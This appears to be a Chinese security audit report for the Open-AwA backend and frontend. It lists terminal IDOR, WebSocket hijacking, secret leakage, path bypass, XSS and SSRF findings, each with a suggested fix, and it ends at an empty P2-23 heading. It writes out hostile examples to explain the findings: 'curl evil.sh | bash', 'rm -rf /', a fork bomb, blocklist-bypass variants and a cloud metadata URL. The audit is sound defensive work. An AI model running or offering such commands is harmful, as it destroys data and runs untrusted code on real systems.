# AI 调用安全与质量审查综合报告

> 审查日期：2026-06-27
> 审查范围：后端 LLM 调用、ACP 协议 AI 调用、前端 AI 调用、API 路由层
> 审查方式：4 个并行子代理静态审查，覆盖约 50 个文件 1 万行代码
> 总体评级：**WARN**（无 RCE 级漏洞，但存在 14 项 P0 必须立即修复的安全问题）

---

## 一、严重问题（P0，必须立即修复）

### P0-1 终端/PTY 会话存在 IDOR（越权访问）

**审查来源**：ACP 审查 F3 + API 路由审查 F1
**问题位置**：
- [backend/api/routes/terminal.py:510-528](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L510) `list_pty_sessions` 返回所有用户会话
- [backend/api/routes/terminal.py:531-550](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L531) `close_pty_session` 不校验归属
- [backend/api/routes/terminal.py:553-574](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L553) `get_pty_snapshot` 不校验归属
- [backend/api/routes/terminal.py:601-805](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L601) `terminal_pty_websocket` 不校验归属
- [backend/api/routes/terminal.py:840-862](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L840) `execute_command` 不校验归属
- [backend/api/routes/terminal.py:865-885](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L865) `close_session` 不校验归属
- [backend/api/routes/terminal.py:888-904](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L888) `list_sessions` 返回所有用户

**问题描述**：`_pty_sessions` 与 `_terminal_sessions` 仅以 `session_id`（8 位 hex，约 4 字节熵）为键存储，访问端点仅校验 `Depends(get_current_user)`，不校验 `current_user.id` 是否为会话创建者。任意已认证用户枚举或猜中 `session_id` 即可读取他人终端快照、关闭他人会话、接管他人 PTY WebSocket、在他人会话执行命令。

**修复方案**：
1. 在 `TerminalSession` 与 `PTYTerminalSession` 类中增加 `owner_user_id: str` 字段，创建时赋值 `current_user.id`
2. 所有访问端点先校验归属：`if session.owner_user_id != str(current_user.id): raise HTTPException(403, "无权访问该会话")`
3. `list_sessions`/`list_pty_sessions` 按 `owner_user_id == str(current_user.id)` 过滤
4. 对比 ACP 路由 `acp.py` 用 `(user_id, session_id)` 元组键隔离是正确做法，可借鉴

---

### P0-2 WebSocket 缺少 Origin 校验（CSWSH 跨站 WebSocket 劫持）

**审查来源**：API 路由审查 F2
**问题位置**：
- [backend/api/routes/chat.py:304-398](file:///d:/代码/Open-AwA/backend/api/routes/chat.py#L304) `websocket_endpoint`
- [backend/api/routes/terminal.py:601-805](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L601) `terminal_pty_websocket`
- [backend/api/routes/terminal.py:907-1013](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L907) `terminal_websocket`

**问题描述**：三处 WebSocket 端点均未校验 `Origin` 头。由于 `get_current_user`（dependencies.py:147-153）会回退到 Cookie 认证，恶意页面可借助浏览器自动携带的 Cookie 发起跨站 WebSocket 攻击（CSWSH）。

**修复方案**：在 `accept()` 前校验 origin：
```python
origin = websocket.headers.get("origin", "")
if not _is_origin_allowed(origin):
    await websocket.close(code=4003, reason="Origin not allowed")
    return

def _is_origin_allowed(origin: str) -> bool:
    if not origin:
        return False
    # 同源允许
    if origin == settings.BASE_URL:
        return True
    # LAN 模式允许私网段
    if settings.ALLOW_LAN_ACCESS and ALLOW_LAN_ORIGIN_REGEX.match(origin):
        return True
    return False
```

---

### P0-3 CSP `connect-src` 放开任意 ws/wss 源

**审查来源**：API 路由审查 F3
**问题位置**：[backend/main.py:1031](file:///d:/代码/Open-AwA/backend/main.py#L1031)

**问题描述**：`"connect-src 'self' ws: wss:; "` 允许页面连接任意 WebSocket 源，CSP 的 XSS 二道防线被显著削弱。攻击者若通过 XSS 注入脚本，可建立任意 WS 连接外泄数据。

**修复方案**：改为显式列举 trusted host：
```python
"connect-src 'self' wss://localhost:* wss://127.0.0.1:*; "
```
或仅 `'self'`，前端 WebSocket 全部走同源反代。

---

### P0-4 Coding API 文件操作未配置 RBAC 与敏感文件 deny 列表

**审查来源**：API 路由审查 F4
**问题位置**：
- [backend/api/routes/coding.py:121-145](file:///d:/代码/Open-AwA/backend/api/routes/coding.py#L121) `read_file` / `write_file`
- [backend/api/routes/coding.py:52-61](file:///d:/代码/Open-AwA/backend/api/routes/coding.py#L52) `_validate_file_path`
- [backend/api/routes/coding.py:662-730](file:///d:/代码/Open-AwA/backend/api/routes/coding.py#L662) `preview_file`

**问题描述**：任何认证用户（含 viewer 角色）均可读写 `DEFAULT_PROJECT_DIR` 内任意文件，未调用 `RBACManager.check_permission`。`_validate_file_path` 仅做"前缀在项目目录内"校验，无 `.env`、`*.key`、`*.pem`、`.git/` 等敏感路径 deny 列表。`preview_file` 可读取 `.env`、`secrets.json` 并以 text/markdown 形式返回。

**修复方案**：
1. 在路由入口校验权限：`RBACManager.check_permission(current_user, "coding:read")` / `"coding:write"`
2. 复用 `security.sandbox.is_path_allowed(path, is_write=True)` 替代自定义 `_validate_file_path`
3. 集成 `security/sandbox.py:51-60` 的 `_DENY_PATH_PATTERNS`（已存在但未在 coding 路由生效）

---

### P0-5 PTY 仅在首行命令做黑名单校验，后续输入无任何过滤

**审查来源**：ACP 审查 F4 + API 路由审查 F7
**问题位置**：[backend/api/routes/terminal.py:375-401](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L375) `write_input`

**问题描述**：`_first_command_checked` 标志置位后，后续所有 stdin 直接写入 PTY 不再走 `_is_command_safe`。用户首行输入 `echo hi` 后，第二行即可输入 `rm -rf /`、`curl evil.sh | bash` 等危险命令而完全不被拦截。

**修复方案**：
1. **方案 A（推荐）**：对每条 `\n` 结束的命令行都做 `_is_command_safe` 校验（需处理 shell 多行、引号续行等复杂情况）
2. **方案 B**：复用 `security.sandbox.validate_command_safety` 替换本地黑名单
3. **方案 C（兜底）**：明确文档化"PTY 模式不提供命令级安全，依赖 OS 沙箱"，创建 PTY 时强制要求 `cwd` 在受限工作区且子进程以低权限用户运行

---

### P0-6 ACP 子进程环境变量泄露敏感信息

**审查来源**：ACP 审查 F1
**问题位置**：[backend/acp_host/service.py:540](file:///d:/代码/Open-AwA/backend/acp_host/service.py#L540) `_open_conversation`

**问题描述**：`env={**os.environ, **agent_config.env}` 将父进程全部环境变量（含 `SECRET_KEY`、`DATABASE_URL`、API 密钥等）继承给 ACP Agent 子进程。Agent 子进程（如 Claude Code、Codex）会执行用户指定的任意代码，可通过 `env` 命令或 `/proc/self/environ` 读取这些密钥。

**修复方案**：建立环境变量白名单或黑名单：
```python
_SENSITIVE_ENV_KEYS = {
    "SECRET_KEY", "JWT_SECRET_KEY", "CSRF_SECRET_KEY", "ENCRYPTION_KEY",
    "DATABASE_URL", "DATABASE_PASSWORD",
    "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "GOOGLE_API_KEY",
}

def _build_safe_env(agent_env: Dict[str, str]) -> Dict[str, str]:
    """构建安全的子进程环境变量，过滤敏感键"""
    safe_env = {
        k: v for k, v in os.environ.items()
        if k not in _SENSITIVE_ENV_KEYS
        and not any(s in k.upper() for s in ("SECRET", "TOKEN", "PASSWORD", "API_KEY"))
    }
    safe_env.update(agent_env)
    # 必要的基础变量
    safe_env.setdefault("PATH", os.environ.get("PATH", "/usr/local/bin:/usr/bin:/bin"))
    safe_env.setdefault("HOME", os.environ.get("HOME", ""))
    safe_env.setdefault("TERM", "xterm-256color")
    return safe_env
```

---

### P0-7 ACP 权限路径前缀匹配绕过

**审查来源**：ACP 审查 F2
**问题位置**：[backend/acp_host/permissions.py:429](file:///d:/代码/Open-AwA/backend/acp_host/permissions.py#L429)

**问题描述**：`if not str(resolved).startswith(self.cwd):` 使用裸字符串前缀匹配。当 `cwd="/home/user"` 时，`/home/userevil/file`、`/home/user2/secret` 等路径会被误判为合法。对比同项目 `coding.py:47,59` 正确使用了 `root_real + os.sep` 形式。

**修复方案**：
```python
# 方案 A：使用 relative_to
try:
    resolved.relative_to(Path(self.cwd))
except ValueError:
    return False

# 方案 B：前缀匹配加 os.sep
cwd_str = str(Path(self.cwd).resolve())
if not str(resolved).startswith(cwd_str + os.sep) and str(resolved) != cwd_str:
    return False
```

---

### P0-8 WebSocket token 通过 query 参数传递，存在泄漏风险

**审查来源**：前端审查 F1 + ACP 审查 W12 + API 路由（多处）
**问题位置**：
- [frontend/src/features/vibe-coding/components/TerminalPane.tsx:280](file:///d:/代码/Open-AwA/frontend/src/features/vibe-coding/components/TerminalPane.tsx#L280)
- [backend/api/routes/terminal.py:605,911](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L605)

**问题描述**：API Key 作为 `?token=` 参数附加在 WebSocket URL 上，会泄漏到：
1. 服务器访问日志（nginx/uvicorn access log）
2. 浏览器历史记录
3. 中间代理服务器日志
4. `Referer` header（若用户从该页面跳转外链）

**修复方案**：
1. **方案 A（推荐）**：使用 `Sec-WebSocket-Protocol` 子协议传递 token
   ```javascript
   const ws = new WebSocket(url, [`bearer.${token}`])
   ```
   后端在 `accept()` 前解析 `Sec-WebSocket-Protocol` 头
2. **方案 B**：连接建立后首条消息发送 `{"type":"auth","token":"..."}`
3. **方案 C**：使用 Cookie 认证（`withCredentials`），后端从 Cookie 中提取 access_token

---

### P0-9 CSRF 保护被完全移除

**审查来源**：前端审查 F2
**问题位置**：
- [frontend/src/shared/api/client.ts:4](file:///d:/代码/Open-AwA/frontend/src/shared/api/client.ts#L4)
- [frontend/src/shared/api/api.ts:393](file:///d:/代码/Open-AwA/frontend/src/shared/api/api.ts#L393)

**问题描述**：注释明确写到"单用户模式下使用 API Key (Bearer) 认证，不再需要 CSRF 保护"，所有 POST/PUT/PATCH/DELETE 请求均未附加 `X-CSRF-Token`。但 CLAUDE.md 中明确记载后端使用"Cookie + CSRF"双重认证。当浏览器携带 Cookie 访问时，攻击者构造的恶意页面可通过 CSRF 利用 Cookie 中的 access_token 执行状态变更操作。

**修复方案**：
1. 启动时调用 `/api/auth/csrf-token` 获取 CSRF token
2. axios 请求拦截器中为 POST/PUT/PATCH/DELETE 自动附加 `X-CSRF-Token`
3. 即便单用户 Bearer 模式也应保留 CSRF 防御

---

### P0-10 prompt 输入无最大长度限制

**审查来源**：前端审查 F3
**问题位置**：
- [frontend/src/features/chat/components/ChatInput.tsx:254-263](file:///d:/代码/Open-AwA/frontend/src/features/chat/components/ChatInput.tsx#L254)
- [frontend/src/features/vibe-coding/components/AcpSessionPanel.tsx:421-429](file:///d:/代码/Open-AwA/frontend/src/features/vibe-coding/components/AcpSessionPanel.tsx#L421)

**问题描述**：前端未对 prompt 长度做任何拦截。虽然后端 Pydantic schema 有 `max_length=32000` 限制，但前端缺失会导致：
1. 用户体验差：超长请求被后端拒绝才报错
2. 潜在 DoS：可发送超大 prompt 消耗 LLM token 配额
3. 浏览器内存：超长文本 + base64 附件可能造成卡顿

**修复方案**：textarea 添加 `maxLength={32000}`，并在 UI 显示字符计数：
```tsx
<textarea
  maxLength={32000}
  value={input}
  onChange={(e) => setInput(e.target.value)}
/>
<span className={styles['char-count']}>{input.length}/32000</span>
```

---

### P0-11 FilePreviewPane 使用 dangerouslySetInnerHTML 渲染后端 HTML

**审查来源**：前端审查 F4
**问题位置**：[frontend/src/features/vibe-coding/components/FilePreviewPane.tsx:366-370](file:///d:/代码/Open-AwA/frontend/src/features/vibe-coding/components/FilePreviewPane.tsx#L366)

**问题描述**：直接信任后端返回的 HTML 内容。虽然后端声称"已净化"，但前端无任何二次校验。一旦后端净化逻辑存在缺陷（如新的 XSS payload 绕过），将直接导致 XSS。违反 quality-checklists.md "XSS 防护：用户输入渲染使用安全的转义/净化方式"。

**修复方案**：
1. **方案 A（推荐）**：使用 DOMPurify 在前端二次净化
   ```bash
   npm install dompurify @types/dompurify
   ```
   ```tsx
   import DOMPurify from 'dompurify'
   const cleanHtml = DOMPurify.sanitize(markdownHtml)
   <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
   ```
2. **方案 B**：改为接收 Markdown 文本在前端渲染（参考 chat 模块的 `AssistantMarkdownContent` 用 ReactMarkdown）

---

### P0-12 SSE 流式响应无最大响应大小限制

**审查来源**：前端审查 F5
**问题位置**：
- [frontend/src/shared/api/api.ts:449-460](file:///d:/代码/Open-AwA/frontend/src/shared/api/api.ts#L449) `sendMessageStream`
- [frontend/src/features/vibe-coding/components/AcpSessionPanel.tsx:251-263](file:///d:/代码/Open-AwA/frontend/src/features/vibe-coding/components/AcpSessionPanel.tsx#L251) `sendPrompt`

**问题描述**：`while (!done)` 循环持续累积 `buffer` 与 events 列表，无任何上限检查。恶意/异常的后端可无限推送数据，导致前端内存耗尽，浏览器标签页崩溃。

**修复方案**：在 while 循环中累计已接收字节数，超过阈值（如 10MB）时主动 abort 并提示用户：
```typescript
let totalBytes = 0
const MAX_RESPONSE_BYTES = 10 * 1024 * 1024  // 10MB

while (!done) {
  const { done, value } = await reader.read()
  if (done) break
  totalBytes += value.byteLength
  if (totalBytes > MAX_RESPONSE_BYTES) {
    abortController.abort()
    appendEvent('error', { message: '响应超过 10MB 上限，已中止' })
    break
  }
  // ... 处理数据
}
```

---

### P0-13 WebSocket 无消息大小限制，存在内存耗尽 DoS 风险

**审查来源**：ACP 审查 W9 + API 路由审查 F5
**问题位置**：
- [backend/api/routes/chat.py:304](file:///d:/代码/Open-AwA/backend/api/routes/chat.py#L304)
- [backend/api/routes/terminal.py:601, 907, 711](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L711)

**问题描述**：未设置 `websocket.application.max_message_size`，`websocket.receive_json()` 直接解析任意大小 JSON。`schemas.py:55` 设置了 `AttachmentItem.data` 14MB 上限但 WebSocket 路径未对应限长。

**修复方案**：
1. 在 uvicorn 启动参数设置 `ws_max_size=1024*1024`（1MB）
2. 或在应用层先 `receive_text` 限制长度再 `json.loads`：
```python
raw = await websocket.receive_text()
if len(raw) > 1024 * 1024:
    await websocket.close(code=4004, reason="Message too large")
    return
msg = json.loads(raw)
```

---

### P0-14 模块级全局字典无容量上限

**审查来源**：ACP 审查 W11 + API 路由审查 F6
**问题位置**：
- [backend/api/routes/acp.py:50](file:///d:/代码/Open-AwA/backend/api/routes/acp.py#L50) `_acp_user_sessions`
- [backend/api/routes/terminal.py:41, 44](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L41) `_terminal_sessions`、`_pty_sessions`
- [backend/api/routes/notifications.py:60, 64](file:///d:/代码/Open-AwA/backend/api/routes/notifications.py#L60) `_notifications_store`、`_notification_subscribers`

**问题描述**：这些字典只增不减（除非主动调用 delete），缺乏 LRU/容量上限，单用户可创建海量 session 触发 OOM。

**修复方案**：
1. 引入 `cachetools.LRUCache(maxsize=1000)` 替换裸 dict
2. 或定期清理过期项（后台任务每 5 分钟扫描 TTL）
3. 限制 per-user 最大会话数（如 10 个）

---

## 二、警告（P1，本周内修复）

### P1-1 LLM 调用路径缺少 SSRF 防护

**审查来源**：后端 LLM 审查
**问题位置**：
- [backend/core/executor.py:908, 952-958](file:///d:/代码/Open-AwA/backend/core/executor.py#L958)
- [backend/billing/pricing_manager.py:101-149](file:///d:/代码/Open-AwA/backend/billing/pricing_manager.py#L119)

**问题描述**：`_resolve_llm_configuration` 直接信任 DB 中存储的 `api_endpoint`，经 `litellm.acompletion(api_base=...)` 发起请求。`PricingManager._normalize_provider_api_endpoint` 只做 URL 格式校验，**不拒绝内网/本地/链路本地 IP**。风险：管理员误配或 DB 被注入 `http://169.254.169.254/...` 元数据端点。

**修复方案**：在 `_resolve_llm_configuration` 返回 `api_endpoint` 前，调用 `ipaddress` 解析主机名，拒绝 `is_private/is_loopback/is_link_local/is_reserved`。可复用 [backend/core/autonomous/network_policy.py:76-81](file:///d:/代码/Open-AwA/backend/core/autonomous/network_policy.py#L76) 的 `is_unsafe_ip` 判定函数。

---

### P1-2 ACP permission future 无超时，可能永久挂起

**审查来源**：ACP 审查 W1
**问题位置**：[backend/acp_host/client.py:272-274](file:///d:/代码/Open-AwA/backend/acp_host/client.py#L272)

**问题描述**：`await self._permission_future` 无超时。若用户关闭浏览器未响应，该 future 永不 resolve，prompt_task 与会话资源永久占用。

**修复方案**：用 `asyncio.wait_for` 包裹超时 300s，超时后返回 `cancelled_response()` 并清理。

---

### P1-3 硬阻断检查晚于 permission_request 事件发送

**审查来源**：ACP 审查 W2
**问题位置**：[backend/acp_host/client.py:256-268](file:///d:/代码/Open-AwA/backend/acp_host/client.py#L256)

**问题描述**：`request_permission` 先 emit `permission_request` 事件推送给前端，再判断 `is_hard_blocked`。命中硬阻断时直接返回 `cancelled_response()`，但前端已弹出权限对话框且不会收到取消通知。

**修复方案**：将 `is_hard_blocked` 检查移到 `build_suspended_permission` 之前，命中则直接返回 `cancelled_response()`，不 emit 任何事件。

---

### P1-4 LLM/ACP/Terminal 命令执行端点未配置专属速率限制

**审查来源**：API 路由审查 W1
**问题位置**：
- [backend/main.py:1089](file:///d:/代码/Open-AwA/backend/main.py#L1089) 仅设置 `default_limits=["60/minute"]`
- [backend/api/routes/chat.py:83](file:///d:/代码/Open-AwA/backend/api/routes/chat.py#L83) `/chat`
- [backend/api/routes/acp.py:275](file:///d:/代码/Open-AwA/backend/api/routes/acp.py#L275) `/sessions/{id}/prompt`
- [backend/api/routes/terminal.py:840](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L840) `/sessions/{id}/execute`

**问题描述**：单用户可绕过成本控制并触发子进程风暴。

**修复方案**：对 `/chat` 设置 `@limiter.limit("10/minute")`，对 ACP prompt 和 terminal execute 设置 `30/minute`。

---

### P1-5 Chat WebSocket 缺少心跳，无法及时清理僵尸连接

**审查来源**：API 路由审查 W2
**问题位置**：[backend/api/routes/chat.py:304-398](file:///d:/代码/Open-AwA/backend/api/routes/chat.py#L304)

**问题描述**：循环中没有 `ping/pong` 或 `asyncio.wait_for` 超时。对比 `notifications.py:266-291`、`acp.py:390-403` 均有 30s 心跳，chat WS 缺失。

**修复方案**：在 read loop 中 `await asyncio.wait_for(websocket.receive_text(), timeout=30)`，超时发送 `: ping\n\n`。

---

### P1-6 SVG 文件预览存在 XSS 风险

**审查来源**：ACP 审查 W10
**问题位置**：[backend/api/routes/coding.py:420, 695-697](file:///d:/代码/Open-AwA/backend/api/routes/coding.py#L695)

**问题描述**：`.svg` 在 `_IMAGE_MIME_MAP` 中映射为 `image/svg+xml`，通过 `_stream_binary_file` 直接返回原始字节。SVG 可内嵌 `<script>`，当浏览器直接访问该 URL 时会执行脚本，构成存储型 XSS。

**修复方案**：
1. **方案 A（推荐）**：对 `.svg` 单独走 bleach 净化（与 Markdown 一致）
2. **方案 B**：返回 `Content-Disposition: attachment` 强制下载
3. **方案 C**：用 `nosniff` 头 + 渲染为 data URI

---

### P1-7 AcpSessionPanel 多个 permission 请求未排队，可能丢失

**审查来源**：前端审查 W4
**问题位置**：[frontend/src/features/vibe-coding/components/AcpSessionPanel.tsx:209, 594](file:///d:/代码/Open-AwA/frontend/src/features/vibe-coding/components/AcpSessionPanel.tsx#L209)

**问题描述**：`setPendingPermission(data)` 直接覆盖，旧值丢失，可能导致 agent 永久挂起。

**修复方案**：改为 `pendingPermissions: SuspendedPermission[]` 队列，逐个处理：
```typescript
const [pendingPermissions, setPendingPermissions] = useState<SuspendedPermission[]>([])
// 收到事件时入队
setPendingPermissions(prev => [...prev, data])
// 处理完后出队
const handleRespond = async (optionId: string) => {
  await respondPermission(...)
  setPendingPermissions(prev => prev.slice(1))
}
// 渲染时只显示队首
const current = pendingPermissions[0]
```

---

### P1-8 max_tool_call_rounds schema 上限与执行器不一致

**审查来源**：后端 LLM 审查
**问题位置**：
- [backend/api/schemas.py:81](file:///d:/代码/Open-AwA/backend/api/schemas.py#L81) `le=50000`
- [backend/core/executor.py:48](file:///d:/代码/Open-AwA/backend/core/executor.py#L48) `min(100, value)`

**修复方案**：将 schemas.py 的 `le=50000` 改为 `le=100`。

---

### P1-9 _resolve_llm_configuration 中 pricing_manager 异常路径不提前返回

**审查来源**：后端 LLM 审查
**问题位置**：[backend/core/executor.py:906-907](file:///d:/代码/Open-AwA/backend/core/executor.py#L906)

**问题描述**：捕获 ProviderCredential 解析异常后仅 warning 后继续走 `api_endpoint = config.api_endpoint`，可能让请求落到错误端点。

**修复方案**：解析异常应直接返回 `_build_error("llm_config_resolve_failed", ...)`，不继续。

---

### P1-10 discover_ollama_models 静默吞异常

**审查来源**：后端 LLM 审查
**问题位置**：[backend/core/model_service.py:442-444](file:///d:/代码/Open-AwA/backend/core/model_service.py#L442)

**修复方案**：至少添加 `logger.warning("Ollama 模型发现失败", exc_info=e)` 后再返回空列表。

---

### P1-11 _get_models_httpx_client 资源泄露

**审查来源**：后端 LLM 审查
**问题位置**：[backend/core/litellm_adapter.py:959-970](file:///d:/代码/Open-AwA/backend/core/litellm_adapter.py#L955)

**问题描述**：`_models_httpx_client` 未在 `main.py` lifespan shutdown 中注册关闭。

**修复方案**：在 `close_shared_client` 中同时关闭 `_models_httpx_client`，或统一复用 `get_shared_client()`。

---

### P1-12 流式 response 未显式 aclose

**审查来源**：后端 LLM 审查
**问题位置**：[backend/core/litellm_adapter.py:788-942](file:///d:/代码/Open-AwA/backend/core/litellm_adapter.py#L788)

**修复方案**：在流式分支的 except 中显式 `if response is not None: try: await response.aclose() except Exception: ...`。

---

### P1-13 HTTP 请求头 ASCII 校验

**审查来源**：后端 LLM 审查
**问题位置**：[backend/core/model_service.py:158-173](file:///d:/代码/Open-AwA/backend/core/model_service.py#L168)

**修复方案**：对 `client_version` 做 ASCII 编码校验，非 ASCII 字符触发 `urllib.parse.quote` 或直接回退到 `settings.VERSION`。

---

### P1-14 get_shared_client 加锁

**审查来源**：后端 LLM 审查
**问题位置**：[backend/core/model_service.py:48-54](file:///d:/代码/Open-AwA/backend/core/model_service.py#L48)

**修复方案**：用 `asyncio.Lock` 双重检查锁定，与 `_get_models_httpx_client` 的写法保持一致。

---

## 三、警告（P2，下个迭代修复）

### P2-1 硬阻断命令模式不完整

**审查来源**：ACP 审查 W3
**问题位置**：[backend/acp_host/permissions.py:49-54](file:///d:/代码/Open-AwA/backend/acp_host/permissions.py#L49)

**问题描述**：`BLOCKED_COMMAND_PATTERNS` 仅覆盖 4 种子串（`rm -rf /`、`sudo rm -rf`、`mkfs`、`dd if=`）。遗漏 fork bomb `:(){:|:&};:`、`chmod -R 777 /`、`find / -delete`、`> /dev/sda`、`shutdown`、`reboot` 等。子串匹配可被 `rm  -rf  /`（多空格）、`rm -fr /`、`rm --recursive --force /` 等变体绕过。

**修复方案**：与 terminal.py 的黑名单对齐；考虑用 `shlex.split` 解析后按命令名匹配而非子串匹配。

---

### P2-2 权限审批无审计日志

**审查来源**：ACP 审查 W4
**问题位置**：[backend/acp_host/service.py:241-284](file:///d:/代码/Open-AwA/backend/acp_host/service.py#L241)

**修复方案**：在 `resume_permission` 成功后 `logger.bind(event="acp_permission_resolved", user_id=..., agent=..., tool_name=..., option_id=...).info(...)`，或调用 `AuditLogger.log_tool_usage`。

---

### P2-3 POSIX 进程树清理仅 kill 根进程

**审查来源**：ACP 审查 W5
**问题位置**：[backend/acp_host/service.py:108-111](file:///d:/代码/Open-AwA/backend/acp_host/service.py#L108)

**修复方案**：POSIX 回退使用 `os.setsid` + `os.killpg(os.getpgid(pid), SIGTERM)`（需在 spawn 时用 `start_new_session=True` 建立进程组），或要求 psutil 为强依赖。

---

### P2-4 清理路径 `except Exception: pass` 静默吞异常

**审查来源**：ACP 审查 W6
**问题位置**：[backend/acp_host/service.py:674-675, 684-685, 817-818](file:///d:/代码/Open-AwA/backend/acp_host/service.py#L674)

**修复方案**：改为 `except Exception as e: logger.debug(f"cleanup error: {e}")`。

---

### P2-5 SSE 队列无上限

**审查来源**：ACP 审查 W7
**问题位置**：[backend/api/routes/acp.py:319](file:///d:/代码/Open-AwA/backend/api/routes/acp.py#L319)

**修复方案**：`asyncio.Queue(maxsize=1000)`，`on_message` 中用 `put_nowait` + `QueueFull` 时丢弃并告警。

---

### P2-6 无最大并发 SSE 连接数限制

**审查来源**：ACP 审查 W8
**问题位置**：
- [backend/api/routes/acp.py:275-434](file:///d:/代码/Open-AwA/backend/api/routes/acp.py#L275)
- [backend/api/routes/notifications.py:245-301](file:///d:/代码/Open-AwA/backend/api/routes/notifications.py#L245)

**修复方案**：维护 per-user 连接计数器，超过阈值（如 10）拒绝新连接。

---

### P2-7 _is_command_safe 黑名单可被多种方式绕过

**审查来源**：API 路由审查 W9
**问题位置**：[backend/api/routes/terminal.py:61-79](file:///d:/代码/Open-AwA/backend/api/routes/terminal.py#L61)

**问题描述**：`python -c "import os; os.system('rm -rf /')"` 可绕过（`python` 不在 BLOCKED_COMMANDS 中）。

**修复方案**：复用 `security.sandbox.validate_command_safety`，统一走白名单策略。

---

### P2-8 CORS LAN 模式覆盖整个私网段

**审查来源**：API 路由审查 W4
**问题位置**：[backend/main.py:126-132](file:///d:/代码/Open-AwA/backend/main.py#L126)

**修复方案**：默认关闭 LAN 模式；启用时仅在调试模式生效，并在生产环境记录审计日志。

---

### P2-9 decode_access_token 每次查 DB

**审查来源**：API 路由审查 W3
**问题位置**：[backend/api/dependencies.py:88-90, 97](file:///d:/代码/Open-AwA/backend/api/dependencies.py#L88)

**修复方案**：使用 Redis 缓存黑名单 jti，或仅在敏感操作时检查。

---

### P2-10 API Key 存储在 localStorage

**审查来源**：前端审查 W1
**问题位置**：[frontend/src/shared/api/client.ts:55, 70-71](file:///d:/代码/Open-AwA/frontend/src/shared/api/client.ts#L55)

**修复方案**：考虑改用 sessionStorage（页面关闭即清除），或使用 IndexedDB 加密存储；至少在文档中标注此风险。

---

### P2-11 WebSocket 无最大重连次数限制

**审查来源**：前端审查 W2
**问题位置**：[frontend/src/features/vibe-coding/components/TerminalPane.tsx:327-349](file:///d:/代码/Open-AwA/frontend/src/features/vibe-coding/components/TerminalPane.tsx#L327)

**修复方案**：增加 `MAX_RECONNECT_ATTEMPTS = 10`，超过后切换到 'closed' 状态并提示用户手动重连。

---

### P2-12 401/403 错误未触发重定向登录

**审查来源**：前端审查 W3
**问题位置**：[frontend/src/shared/api/client.ts:177-213](file:///d:/代码/Open-AwA/frontend/src/shared/api/client.ts#L177)

**修复方案**：在 401 时调用 `clearCachedApiKey()` 并跳转登录页；403 时显示"无权限"提示。

---

### P2-13 iframe sandbox 允许访问父页面 DOM

**审查来源**：前端审查 W5
**问题位置**：[frontend/src/features/vibe-coding/components/FilePreviewPane.tsx:352](file:///d:/代码/Open-AwA/frontend/src/features/vibe-coding/components/FilePreviewPane.tsx#L352)

**修复方案**：评估是否必须 `allow-same-origin`，若仅展示静态资源可移除；或使用 `sandbox="allow-scripts allow-forms allow-popups"`（不同源则无法访问父 DOM）。

---

### P2-14 resolveBaseURL 从 localStorage 读取，可被篡改

**审查来源**：前端审查 W6
**问题位置**：[frontend/src/shared/api/client.ts:21-35](file:///d:/代码/Open-AwA/frontend/src/shared/api/client.ts#L21)

**修复方案**：限制后端 URL 必须为白名单域名，或仅允许在设置页通过确认对话框修改。

---

### P2-15 chat.py 异常返回原始异常字符串

**审查来源**：API 路由审查 W8
**问题位置**：[backend/api/routes/chat.py:158](file:///d:/代码/Open-AwA/backend/api/routes/chat.py#L158)

**修复方案**：仅返回通用错误消息，详细错误写日志。

---

### P2-16 acp.py 异常透传内部细节

**审查来源**：API 路由审查 W11
**问题位置**：[backend/api/routes/acp.py:382](file:///d:/代码/Open-AwA/backend/api/routes/acp.py#L382)

**修复方案**：仅推送通用错误码，详细错误写日志（已记录于 line 379）。

---

### P2-17 LSP 路由异常捕获过宽

**审查来源**：API 路由审查 W6
**问题位置**：[backend/api/routes/coding.py:318-319, 340-341, 361-362, 377-378](file:///d:/代码/Open-AwA/backend/api/routes/coding.py#L318)

**修复方案**：拆分为具体异常类型（OSError、JSONDecodeError 等），并使用 logger 记录。

---

### P2-18 git_log max_count 无上界

**审查来源**：API 路由审查 W5
**问题位置**：[backend/api/routes/coding.py:184-191](file:///d:/代码/Open-AwA/backend/api/routes/coding.py#L184)

**修复方案**：改为 `max_count: int = Query(20, ge=1, le=500)`。

---

### P2-19 preview_proxy 路径深度无限制

**审查来源**：API 路由审查 W10
**问题位置**：[backend/api/routes/preview_proxy.py:65-118](file:///d:/代码/Open-AwA/backend/api/routes/preview_proxy.py#L65)

**修复方案**：增加路径白名单或 deny 列表（如禁止 `/_internal`、`/admin` 等前缀）。

---

### P2-20 ClaudeCodeAdapter 同步阻塞调用

**审查来源**：后端 LLM 审查
**问题位置**：
- [backend/core/coding/claude_code.py:175-178, 82-103, 456-463, 503-523](file:///d:/代码/Open-AwA/backend/core/coding/claude_code.py#L456)

**问题描述**：多处 `subprocess.run`、`os.walk` 同步阻塞调用未包装到 `asyncio.to_thread`。

**修复方案**：将 `subprocess.run` 替换为 `asyncio.create_subprocess_exec` + `asyncio.wait_for`，或将整个同步函数体包装到 `asyncio.to_thread`。

---

### P2-21 _execute_tool_call 多处宽泛 except

**审查来源**：后端 LLM 审查
**问题位置**：[backend/core/executor.py:1891-1898, 1911-1918, 2002-2008](file:///d:/代码/Open-AwA/backend/core/executor.py#L1891)

**修复方案**：引入具体异常类（`PluginExecutionError`、`MCPToolError` 等），便于上层分类降级。

---

### P2-22 AcpSessionPanel 错误信息直接显示后端原始 message

**审查来源**：前端审查 W7
**问题位置**：[frontend/src/features/vibe-coding/components/AcpSessionPanel.tsx:237, 282, 339](file:///d:/代码/Open-AwA/frontend/src/features/vibe-coding/components/AcpSessionPanel.tsx#L237)

**修复方案**：参照 useChatStream 的 `sanitizeDisplayedError` 做转义。

---

### P2-23 handleWsMessage 未做严格类型校验

**审查来源**：前端审查 W8
